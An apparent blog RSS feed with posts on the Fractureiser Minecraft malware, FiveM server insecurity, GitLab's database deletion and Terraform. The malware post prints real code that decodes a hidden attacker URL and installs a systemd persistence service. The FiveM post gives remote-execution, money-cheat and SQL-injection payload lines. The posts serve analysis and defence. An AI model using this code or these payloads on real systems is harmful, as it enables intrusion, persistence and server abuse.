<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/">
    <title>DF Blogs</title>
    <link href="https://blog.thefourcraft.com/feed.xml" rel="self" />
    <link href="https://blog.thefourcraft.com" />
    <updated>2023-06-25T19:17:42+03:00</updated>
    <author>
        <name>thefourCraft</name>
    </author>
    <id>https://blog.thefourcraft.com</id>

    <entry>
        <title>The Devastating Fractureiser: Minecraft&#x27;s Malware Outbreak</title>
        <author>
            <name>thefourCraft</name>
        </author>
        <link href="https://blog.thefourcraft.com/the-devastating-fractureiser-minecrafts-malware-outbreak/index.html"/>
        <id>https://blog.thefourcraft.com/the-devastating-fractureiser-minecrafts-malware-outbreak/index.html</id>
        <media:content url="https://blog.thefourcraft.com/media/posts/53/The-Devastating-Fractureiser-Minecrafts-Malware-Outbreak.png" medium="image" />
            <category term="Minecraft"/>
            <category term="Malware"/>
            <category term="Fractureiser"/>

        <updated>2023-06-25T19:17:42+03:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://blog.thefourcraft.com/media/posts/53/The-Devastating-Fractureiser-Minecrafts-Malware-Outbreak.png" alt="" />
                    <p>In Minecraft, a new threat has emerged A malware known as the "Fractureiser" has been causing havoc, infecting mods and spreading. This blog post aims to shed light on this devastating outbreak, providing an in-depth analysis of the malware, its impact, and the steps taken by the community to combat it.</p>

                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://blog.thefourcraft.com/media/posts/53/The-Devastating-Fractureiser-Minecrafts-Malware-Outbreak.png" class="type:primaryImage" alt="" /></p>
                <p>In Minecraft, a new threat has emerged A malware known as the "Fractureiser" has been causing havoc, infecting mods and spreading. This blog post aims to shed light on this devastating outbreak, providing an in-depth analysis of the malware, its impact, and the steps taken by the community to combat it.</p>

<h2>The Emergence of Fractureiser</h2>
<p>The Fractureiser malware was first discovered when a Minecraft server hosting company, MCHost.no, was contacted by a customer reporting that his server was not starting correctly. The server would freeze when loading the plugins, a symptom that usually indicates a problem with a faulty or incompatible plugin. However, after several days of back and forth, it was discovered that the issue was much more severe. The customer's plugins were infected with a "virus" that he had unknowingly downloaded from a shady<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-1%5E" id="user-content-fnref-1%5E" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>.</p>
<p>The malware was traced back to a class file named "Updater.Class" found in the infected plugins. The file was encoded and could not be decompiled using standard methods, making it difficult to understand its functionality<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-1%5E" id="user-content-fnref-1%5E-2" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>. However, further investigation revealed that the malware connected to a host via an encoded URL<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-1%5E" id="user-content-fnref-1%5E-3" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>.</p>
<h2>The Fractureiser's Modus Operandi</h2>
<p>The Fractureiser malware operates by infecting Minecraft mods and spreading across servers. It uses a class file named "Updater.Class" to infect plugins and then connects to a host via an encoded URL<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-1%5E" id="user-content-fnref-1%5E-4" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>. The malware also sets itself up for continued access, making it challenging to remove<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-1%5E" id="user-content-fnref-1%5E-5" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>.</p>
<p>The malware was found to be particularly dangerous as it could spread across servers. However, due to the use of Docker containers for hosting Minecraft servers on MCHost.no, each server was isolated, preventing the malware from spreading between servers<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-1%5E" id="user-content-fnref-1%5E-6" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>.</p>
<h2>The Community's Response</h2>
<p>The Minecraft community has taken several steps to combat the Fractureiser malware in response to the outbreak. A detection tool was developed to help users identify if their computer has been infected<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-4%5E" id="user-content-fnref-4%5E" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. The tool checks if the user's system is infected and lists the detected files<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-4%5E" id="user-content-fnref-4%5E-2" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. If an infection is found, the user is advised to delete the infected files and run independent malware scanning tools<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-4%5E" id="user-content-fnref-4%5E-3" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>.</p>
<p>In addition to the detection tool, a scanning tool was also developed to detect any dormant or other infected mods/Jar files<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-4%5E" id="user-content-fnref-4%5E-4" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. This tool scans for stage 0 vulnerability and can detect any infected Jars<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-4%5E" id="user-content-fnref-4%5E-5" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>.</p>
<h2>The Impact of the Fractureiser Malware</h2>
<p>The impact of the Fractureiser malware has been significant, with several mods being infected and taken down permanently<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-4%5E" id="user-content-fnref-4%5E-6" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. The malware has also infected several Bukkit plugins<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-4%5E" id="user-content-fnref-4%5E-7" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. At the time of detection, the total non-unique downloads for some of the infected mods and plugins were in the hundreds, indicating the widespread nature of the infection<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-4%5E" id="user-content-fnref-4%5E-8" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>.</p>
<p>The following code snippets are from the Fractureiser malware and provide insight into how it operates:</p>
<p>This snippet shows how the malware connects to a host via an encoded URL:</p>
<p><code>HttpURLConnection var2 = (HttpURLConnection)(new URL(new String(Base64.getDecoder().decode("aHR0cDovL2ZpbGVzLnNreXJhZ2UuZGUvdXBkYXRl")))).openConnection();</code></p>
<p>The malware connects to a host using an encoded URL. The URL is decoded from Base64 format and then used to open a connection. This method allows the malware to hide the URL it connects to, making it harder for security systems to detect and block it.</p>
<p>This snippet shows how the malware sets itself up for continued access:</p>
<pre>var0 = new File("/bin/vmd-gnu");<br>File var1 = new File("/etc/systemd/system/vmd-gnu.service");<br>String var2 = "[Unit]\\nDescription=vmd-gnu local service\\nAfter=network.target\\nStartLimitIntervalSec=0\\n\\n[Service]\\nType=simple\\nRestart=always\\nRestartSec=1\\nUser=" + System.getProperty("user.name") + "\\nExecStart=/bin/sh -c \\\"java -Dauto=true -jar /bin/vmd-gnu\\\"\\n\\n[Install]\\nWantedBy=multi-user.target";<br>URL var3 = O.class.getProtectionDomain().getCodeSource().getLocation();<br>Files.copy((new File(var3.getFile())).toPath(), var0.toPath(), StandardCopyOption.REPLACE_EXISTING);<br>Files.write(var1.toPath(), var2.getBytes(), new OpenOption[0]);<br>Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "systemctl enable vmd-gnu"}).waitFor();<br>Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "systemctl start vmd-gnu"}).waitFor();</pre>
<p>The malware sets itself up for continued access by creating a new service in the system. It creates a new file in the "/bin" directory and a new service in the "/etc/systemd/system" directory. The service is configured to restart always, ensuring that the malware remains active even if the system is rebooted or the process is killed. The service runs with the same privileges as the user, allowing it to perform actions on behalf of the user.</p>
<h2>The Aftermath</h2>
<p>The aftermath of the Fractureiser malware outbreak was intense activity within the Minecraft community. The hosting company, MCHost.no, took immediate steps to block the domain associated with the malware, thereby reducing its potential harm<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-1%5E" id="user-content-fnref-1%5E" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>. The customer whose server was initially infected had to reinstall all plugins and server.jar, but after these steps, the server was no longer connecting to the malicious server<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-1%5E" id="user-content-fnref-1%5E-2" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">1</a></sup>.</p>
<p>The community also rallied to provide support and solutions. A detection tool was developed and made available to help users identify if their computer had been infected<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-4%5E" id="user-content-fnref-4%5E" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. The tool checks if the user's system is infected and lists the detected files<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-4%5E" id="user-content-fnref-4%5E-2" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. If an infection is found, the user is advised to delete the infected files and run independent malware scanning tools<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-4%5E" id="user-content-fnref-4%5E-3" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>.</p>
<p>In addition to the detection tool, a scanning tool was also developed to detect any dormant or other infected mods/Jar files<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-4%5E" id="user-content-fnref-4%5E-4" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. This tool scans for stage 0 vulnerability and can detect any infected Jars<sup><a href="https://chat.openai.com/c/1ecf21f3-cd9e-4f1c-a86e-c17712d62d5a#user-content-fn-4%5E" id="user-content-fnref-4%5E-5" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>.</p>
<h2>Lessons Learned</h2>
<p>The Fractureiser malware outbreak has served as a stark reminder of the potential threats that exist in the world of online gaming. It has highlighted the importance of downloading mods and plugins from trusted sources to avoid such issues in the future. The swift response of the Minecraft community in developing detection and scanning tools to combat the malware is commendable. It serves as an example of the power of community collaboration in the face of adversity.</p>
<p>The incident has also underscored the importance of vigilance and proactive measures in maintaining the security of online gaming environments. As the Fractureiser malware has shown, even seemingly harmless activities like downloading a Minecraft mod can have severe consequences without caution.</p>
<h2>References</h2>
<section class="footnotes" data-footnotes="true">
<ol>
<li id="user-content-fn-1%5E">
<p><a href="https://ljskatt.no/analysis/updater_class/" target="_new">Lars Jørgen Skattebo - Updater.class</a> </p>
</li>
<li id="user-content-fn-4%5E">
<p><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" target="_new">CurseForge Support - June 2023 - Infected mods detection tool</a></p>
</li>
</ol>
</section>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Why FiveM Servers Are So Insecure</title>
        <author>
            <name>thefourCraft</name>
        </author>
        <link href="https://blog.thefourcraft.com/kubernetes-privilege-escalation-excessive-permissions-in-popular-platforms/index.html"/>
        <id>https://blog.thefourcraft.com/kubernetes-privilege-escalation-excessive-permissions-in-popular-platforms/index.html</id>
        <media:content url="https://blog.thefourcraft.com/media/posts/52/Why-FiveM-Servers-Are-So-Insecure.png" medium="image" />
            <category term="Vulnerability"/>
            <category term="Security"/>
            <category term="My Personal Opinion"/>
            <category term="Gaming"/>
            <category term="FiveM"/>

        <updated>2023-06-24T15:32:24+03:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://blog.thefourcraft.com/media/posts/52/Why-FiveM-Servers-Are-So-Insecure.png" alt="" />
                    <p>A deep dive into FiveM server security, This post aims to shed light on why these servers are insecure and how cheaters can exploit these insecurities.</p>

                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://blog.thefourcraft.com/media/posts/52/Why-FiveM-Servers-Are-So-Insecure.png" class="type:primaryImage" alt="" /></p>
                <p>A deep dive into FiveM server security, This post aims to shed light on why these servers are insecure and how cheaters can exploit these insecurities.</p>

<h2>Introduction</h2>
<p>FiveM is a modification framework for Grand Theft Auto V, enabling you to play multiplayer on customized dedicated servers. Despite its popularity and extensive features, FiveM servers are often criticized for their security vulnerabilities.</p>
<h2>Understanding the Threat Landscape</h2>
<p>Before we can effectively secure our servers, we must first understand what we're up against. Hackers and cheaters are constantly finding new ways to exploit server vulnerabilities, and their methods are often as sophisticated as diverse.</p>
<h2>Understanding Resources and Streaming</h2>
<p>In a FiveM server, resources are the addons that allow you to customize your server. These resources can be scripts, maps, vehicles, etc. They are streamed to the player when they connect to the server and during their gameplay. This streaming process allows for a dynamic and immersive gaming experience. However, it also opens up potential security vulnerabilities.</p>
<h1>Insecure Resources</h1>
<h2>What is an Insecure Resource?</h2>
<p>To understand the concept of an insecure resource, we must delve into the possibilities a resource provides to a cheater. In an ideal scenario, a resource should validate the input it receives from clients multiple times. However, in reality, many resources accept input without a second thought, sometimes even allowing the execution of arbitrary code on your server.</p>
<p>You might think, isn't executing code harmless? What harm could come from it? Well, let's consider an example. Here's a quick and easy way to stop a Linux-Based Server (the entire server, not just the FiveM Server!) if the FXServer is run with administrative privileges:</p>
<pre><code>TriggerServerEvent("RunCode:RunRemotelly", "os.execute('shutdown now')")</code></pre>
<p>Yes, it's that simple. But remote code execution isn't the only thing a cheater can do. What if a cheater wants to do something seemingly harmless, like giving themselves money? Here's an example:</p>
<pre><code>for i=1, 100 do</code><br><code>    TriggerServerEvent("esx_carsshop:sv:1", 5000, "cheated", "cheated")</code><br><code>end</code></pre>
<div class="bg-black rounded-md mb-4">
<h1>SQL Injections</h1>
<h2>SQL Injection in FiveM Servers</h2>
<p>In my blog, I have talked about <a href="https://blog.thefourcraft.com/securing-your-fivem-server-from-sql-vulnerabilities/index.html" target="_blank" rel="noopener noreferrer">How to prevent SQL injections in your FiveM server </a><br>In the context of FiveM servers, SQL injection can be particularly damaging, which is why developers and server owners must pay close attention to prevent <a href="https://blog.thefourcraft.com/securing-your-fivem-server-from-sql-vulnerabilities/index.html" target="_blank" rel="noopener noreferrer">SQL injections</a></p>
<h2>Understanding SQL Injection</h2>
<p>SQL injection, also known as SQLI, is a common attack vector that uses malicious SQL code for backend database manipulation to access information not intended to be displayed. This information may include sensitive company data, user lists, or private customer details. The impact SQL injection can have on a business is far-reaching. <br>A successful attack may result in unauthorized viewing of user lists, deletion of entire tables, and the attacker gaining administrative rights to a database in certain cases. All of these outcomes are highly detrimental to a business.</p>
<p>SQL injections typically fall under three categories: In-band SQLi (Classic), Inferential SQLi (Blind), and Out-of-band SQLi.</p>
<ul>
<li>
<p><strong>In-band SQLi: </strong>The attacker uses the same communication channel to launch their attacks and gather their results. It's one of the most common types of SQLi attack due to its simplicity and efficiency.</p>
</li>
<li>
<p><strong>Inferential (Blind) SQLi:</strong> The attacker sends data payloads to the server and observes the response and behavior of the server to learn more about its structure. This method is called blind SQLi because the data is not transferred from the website database to the attacker, thus the attacker cannot see information about the attack in-band.</p>
</li>
<li>
<p><strong>Out-of-band SQLi:</strong> The attacker can only carry out this form of attack when certain features are enabled on the database server used by the web application. This attack is primarily used as an alternative to the in-band and inferential SQLi techniques.</p>
</li>
</ul>
SQL injection can be used to manipulate a standard SQL query to exploit non-validated input vulnerabilities in a database.</div>
<div class="bg-black rounded-md mb-4">For example, an attacker could alter a typical website’s SQL database query to read <code>http://www.website.com/items/items.asp?itemid=999 or 1=1</code>. As a result, the corresponding SQL query would look like this:</div>
<pre><code>SELECT ItemName, ItemDescription</code><br><code>FROM Items</code><br><code>WHERE ItemNumber = 999 OR 1=1</code></pre>
<div>
<p>And since the statement 1 = 1 is always true, the query returns all of the product names and descriptions in the database, even those that you may not be eligible to access.</p>
<h1>The RCON Exploit</h1>
<h2>Understanding the RCON Exploit</h2>
<p>The RCON exploit revolves around the misuse of the RCON password, a password used to provide remote console access to a server. If this password is known or easily guessable, it can be used to gain unauthorized access to the server. This is particularly concerning if the server is running on an account with administrative privileges, as it allows for the execution of arbitrary commands on the server.</p>
<p>The exploit works by first gaining access to the RCON of the server. Once access is gained, the attacker can use the 'runcode' resource, a base FiveM resource found on almost every FiveM server, to execute code on the server, on a specific client, or all clients at once.</p>
<p>The attacker can then use the 'os.execute()' function to run commands on the server's command line, create temporary files to store the output of these commands, and then read these files to gain information about the server. This can be used to find out the current user account running the server, change the password of this account, or even create a new user account with administrative privileges.</p>
<h2>The Potential Damage</h2>
<p>The potential damage from this exploit is significant. An attacker could take over the entire machine, infect resources with malicious code, install keyloggers or trojans to log sensitive information, or even use the machine as part of a Distributed Denial of Service (DDoS) attack.</p>
<p><span style="color: var(--headings-color); font-family: var(--font-base); font-size: 1.60181em; font-weight: var(--font-weight-bold); letter-spacing: var(--letter-spacing);">How to Build A Secure FiveM Server</span></p>
</div>
<div class="bg-black rounded-md mb-4">
<p>Securing your resources is challenging, especially if you are unfamiliar with coding. <br>It is strongly recommended to get someone who is capable of coding on board and then auditing your resources. There is no "one-check-finds-all" solution. Every resource requires its way of securing it against cheaters and hackers. However, simply not accepting random input, as many resources do, ensures your server is free of cheaters.</p>
<p>A good example of correctly using the inbuilt FiveM permission system is vMenu and EasyAdmin. These resources double-check each event with the ACE Natives, ensuring that no one can do things they shouldn't be able to do.</p>
<div class="group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]">
<div class="flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto">
<div class="relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]">
<div class="flex flex-grow flex-col gap-3">
<div class="min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4">
<div class="markdown prose w-full break-words dark:prose-invert dark">
<p>On another note, employing <a href="https://www.vaultproject.io/" target="_blank" rel="noopener noreferrer">Vault by HashiCorp</a> to rotate secrets, such as the RECON password, is highly advisable. Regularly changing your RCON password is strongly recommended, and ensuring it is not easily guessable is essential. Disabling RCON altogether is also recommended as an additional security measure if feasible.</p>
</div>
</div>
</div>
</div>
</div>
</div>
<p>In addition to these measures, it's important to regularly audit your resources and ensure they are not accepting random input. This goes a long way in ensuring your server is free of cheaters and hackers.</p>
<p>While FiveM servers offer a unique and customizable gaming experience but are not without security vulnerabilities. Server owners must understand these vulnerabilities and take the necessary steps to secure their servers.</p>
<h2>So Why FiveM Servers Are So Insecure</h2>
<div class="group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]">
<div class="flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto">
<div class="relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]">
<div class="flex flex-grow flex-col gap-3">
<div class="min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4">
<div class="markdown prose w-full break-words dark:prose-invert dark">The primary concern lies with server owners who neglect proper security measures. Securing a FiveM server necessitates a proactive approach. <br>By comprehending potential vulnerabilities and implementing suitable security measures, server owners can safeguard their servers and establish a secure and equitable gaming environment for their players. Always remember, in cybersecurity, a potent offense is the best defense.</div>
</div>
</div>
</div>
</div>
</div>
</div>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Dev Deletes Entire Production Database</title>
        <author>
            <name>thefourCraft</name>
        </author>
        <link href="https://blog.thefourcraft.com/dev-deletes-entire-production-database-chaos-ensues/index.html"/>
        <id>https://blog.thefourcraft.com/dev-deletes-entire-production-database-chaos-ensues/index.html</id>
        <media:content url="https://blog.thefourcraft.com/media/posts/51/Dev-Deletes-Entire-Production-Database.png" medium="image" />
            <category term="GitLab"/>

        <updated>2023-06-24T16:30:04+03:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://blog.thefourcraft.com/media/posts/51/Dev-Deletes-Entire-Production-Database.png" alt="" />
                    On a seemingly ordinary day at GitLab HQ, a disaster was about to unfold. GitLab, an open-source code sharing platform,&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://blog.thefourcraft.com/media/posts/51/Dev-Deletes-Entire-Production-Database.png" class="type:primaryImage" alt="" /></p>
                <p>On a seemingly ordinary day at GitLab HQ, a disaster was about to unfold. GitLab, an open-source code sharing platform, operates fully remotely, and on this day, one of their team members was about to sign off for the day, unaware of the catastrophe that lay ahead.</p>
<h2>The Beginning of the Crisis</h2>
<p>At 6 PM UTC, the team member was paged in due to high database load. Upon investigation, he noticed a dramatic increase in the total number of snippets, leading him to assume that the root cause was spam. This was a fair assumption as GitLab had been experiencing similar spam issues in the past week, albeit less severe. Over the next few hours, the team attempted to block certain spam IPs and delete spam users.</p>
<p>By 9 pm, they were alerted to an elevated number of locks in the database. Whenever write transactions are made to a record, it enforces a lock, forcing further writes to the record to wait for the first one to finish. This ensures that the writes do not interfere with each other. More spam meant more writes, more locks, and more latency. The engineers continued to search for other sources of spam.</p>
<h2>The Alarm Bells Ring</h2>
<p>Suddenly, a different alarm went off, this time for database replication lag. GitLab had two databases: a primary one and a secondary replica. Users would write to the primary database, which would then forward the same write to the secondary. The process of forwarding the identical writes to the secondary database is called replication, and over 4 gigabytes of data in the primary database failed to replicate in the secondary. This was a novel issue without proper documentation, so the team member stayed online to support the team.</p>
<h2>The Failed Attempt to Restore</h2>
<p>The team decided to use the PostgreSQL command <code>pg_basebackup</code> to create a backup from the live database. The plan was to remove the existing incomplete data on the secondary database and run <code>pg_basebackup</code> to copy the current primary database data to the secondary and then restart replication from there. However, the command failed, complaining that the primary database did not have enough replication clients.</p>
<p>In response, the team member SSH-ed onto the primary database and increased this value in the config. Upon attempting to reload Postgres, it complained that there were too many open connections, which happens when max connections is set too high. He lowered this value, and this time the settings applied without issue.</p>
<p>However, when he ran <code>pg_basebackup</code> again, it appeared to just hang and do nothing. Frustration began to kick in. The engineers thought perhaps the prior attempts to run <code>pg_basebackup</code> before the configuration changes had created some buggy files in the data directory, interfering with the current run. The fix would be to remove these files and try again.</p>
<h2>The Catastrophic Mistake</h2>
<p>"Well might as well give it a shot," thought the team member, "a hard reset to start on a clean slate, so to say." He prepared the command to <code>rm -rf</code> the directory and ran it in his shell session. Immediately after pressing enter, he noticed the shell in which he ran the command was the one connected to the live production primary database. He tried to stop the command, but it was too late. Of the over 300 gigabytes of data, only 4.5 was left. The secondary database had previously been wiped of data before running the backup command. GitLab now officially had zero data in any of their production database servers.</p>
<h2>The Recovery Process</h2>
<p>The team scrambled to find a copy of the production data. They checked for the database backups that were supposed to be uploaded to S3 but found nothing there. They also checked for disk snapshots, butthey found they didn't actually take these snapshots for their database servers as they assumed the other backup procedures were sufficient. Lastly, they checked for logical volume snapshots or backups of the file system.</p>
<p>GitLab had a staging database for testing which periodically captured snapshots from the primary database to remain up to date with production. These snapshots were normally captured once every 24 hours, but luckily, the team member had taken a snapshot six hours before the outage.</p>
<p>Now there were two choices: they could copy either the entire LVM snapshot or just the Postgres data directory from staging to production. The amount of data was similar in both options, but they opted to copy the data directory as that would be easier to restore from.</p>
<p>However, their staging environment used Azure Classic in a different region, without premium storage, which they could not retroactively upgrade. Therefore, data transfer rates were limited to around 60 megabits per second. Copying the data to production took a solid 18 hours and nearly 24 hours later, GitLab was back up to normal operation.</p>
<p>The only caveat was that all database data such as projects, issues, and snippets created in the six hours between the LVM snapshot and the outage were permanently lost. This affected around 5000 projects, 5000 comments, and 700 users.</p>
<h2>Lessons Learned</h2>
<p>Post incident, it was discovered that the replication lag was actually caused by a background job trying to delete a GitLab employee's account due to it being reported for abuse by a troll in combination with the other spam.</p>
<p>The team also discovered that the database backups weren't uploaded to S3 because the server which was taking the database backups was using the wrong version of Postgres. These failures should have sent warning emails but they never received any of them because they forgot to enable DMARC authentication on the backup server.</p>
<p>The incident highlighted the importance of having a second pair of eyes to review commands before running them, especially in a production environment. It also emphasized the need for thorough load testing and regular testing of backup procedures.</p>
<p>In the end, the team member was not fired. There were many factors which led to that <code>rm -rf</code> moment and many more factors which led to it taking 18 hours to recover from there, none of which were a single person's fault. GitLab's CEO personally apologized for the outage, and GitLab never accidentally deleted their production database ever again.</p>
<p>This incident serves as a stark reminder of the importance of robust backup procedures, careful command execution, and thorough testing in maintaining the integrity of production databases.</p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Terraform: A Game-Changer</title>
        <author>
            <name>thefourCraft</name>
        </author>
        <link href="https://blog.thefourcraft.com/terraform-a-game-changer-for-code-deployment/index.html"/>
        <id>https://blog.thefourcraft.com/terraform-a-game-changer-for-code-deployment/index.html</id>
        <media:content url="https://blog.thefourcraft.com/media/posts/50/Terraform-A-Game-Changer.png" medium="image" />
            <category term="Terraform"/>
            <category term="HashiCorp"/>
            <category term="DevOps"/>

        <updated>2023-06-24T16:24:09+03:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://blog.thefourcraft.com/media/posts/50/Terraform-A-Game-Changer.png" alt="" />
                    <p>Terraform, a tool developed by HashiCorp, has revolutionized how developers deploy code. This open-source infrastructure as code (IaC) software tool enables developers to define and provide data center infrastructure using a declarative configuration language. </p>

                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://blog.thefourcraft.com/media/posts/50/Terraform-A-Game-Changer.png" class="type:primaryImage" alt="" /></p>
                <p>Terraform, a tool developed by HashiCorp, has revolutionized how developers deploy code. This open-source infrastructure as code (IaC) software tool enables developers to define and provide data center infrastructure using a declarative configuration language. </p>

<h2>What is Infrastructure as Code (IaC)?</h2>
<p>Infrastructure as Code (IaC) manages and provides computing infrastructure with machine-readable definition files rather than hardware configuration or interactive configuration tools. It's a way to automate your infrastructure to make it quicker, more efficient, and less error-prone.</p>
<p>The concept of IaC revolves around the idea of declarative programming. Instead of writing code to perform iterative or procedural actions based on the current state of your environment, you describe what the expected state of your environment should look like, and Terraform will perform the necessary changes to achieve it. This approach keeps the definition of your system concise and understandable, even as the infrastructure becomes more complex.</p>
<h2>Why Use Terraform?</h2>
<p>Terraform is not the only tool that can do infrastructure as code, but it's probably the most ubiquitous. It allows you to build, change, and version Cloud resources safely and efficiently. Here are some of the key benefits of using Terraform:</p>
<ol>
<li>
<p><strong>Deterministic and Repeatable Method for Managing Infrastructure</strong>: With Terraform, tearing down an entire environment and rebuilding it is possible in just two steps. This makes managing your infrastructure more predictable.</p>
</li>
<li>
<p><strong>Version Control</strong>: By checking your code into a Version Control System such as Git, you get all its benefits, such as having your IaC reviewed by other developers and having a log of changes made to your environment.</p>
</li>
<li>
<p><strong>Automation</strong>: Terraform allows you to automate the deployment process. For example, rather than manually deploying any changes you make to your Lambda function each time you make them, you can set up a continuous deployment pipeline to apply your changes whenever you commit to your main branch.</p>
</li>
</ol>
<h2>Deploying Infrastructure with Terraform</h2>
<p>To illustrate Terraform's work, consider a simple scenario: deploying an app with an AWS Lambda function, an SQS queue, and an S3 bucket. Here's how you can use Terraform to deploy this infrastructure:</p>
<ol>
<li>
<p><strong>Install Terraform</strong>: The first step is to install Terraform on your system. You can use a tool like then, which allows you to manage different versions of Terraform.</p>
</li>
<li>
<p><strong>Define Your Infrastructure</strong>: In Terraform, you define your infrastructure in .tf files using the HashiCorp Configuration Language (HCL). For example, you can specify an S3 bucket resource in a file called main.tf.</p>
</li>
<li>
<p><strong>Initialize Terraform</strong>: Once you've defined your infrastructure, you can initialize Terraform in your project directory using the <code>Terraform init</code> command. This command downloads the necessary provider plugins.</p>
</li>
<li>
<p><strong>Plan and Apply Changes</strong>: With Terraform, you can see the changes that will be made to your infrastructure before they are applied. You can do this using the <code>terraform plan</code> command. You can apply the changes using the Terraform apply base if everything looks good.</p>
</li>
<li>
<p><strong>Destroy Resources</strong>: If you want to tear down the resources you've created, you can use the <code>terraform destroy</code> command.</p>
</li>
</ol>
<h2>Conclusion</h2>
<p>Terraform has forever changed the way developers deploy code. It brings a level of automation and predictability to infrastructure management that was previously difficult to achieve. By treating infrastructure as code, Terraform allows developers to take full advantage of version control systems and continuous integration/continuous deployment (CI/CD) pipelines, leading to more reliable and efficient infrastructure deployments.</p>
<p>However, as with any tool, using Terraform responsibly is essential. Always review the changes that Terraform plans to make before applying them, and be mindful of the resources you create to avoid unnecessary costs. And remember, while Terraform can make your life much easier, it's not a silver bullet. It's a powerful tool in a developer's toolkit but must be used with good practices and careful planning.</p>
<p>Ultimately, using a tool like Terraform makes your infrastructure more manageable, reliable, and efficient. Treating your infrastructure as code can bring all the benefits of modern software development practices to the infrastructure management world. And that's a game-changer.</p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>How One Line of Code Almost Blew Up the Internet</title>
        <author>
            <name>thefourCraft</name>
        </author>
        <link href="https://blog.thefourcraft.com/how-one-line-of-code-almost-blew-up-the-internet/index.html"/>
        <id>https://blog.thefourcraft.com/how-one-line-of-code-almost-blew-up-the-internet/index.html</id>
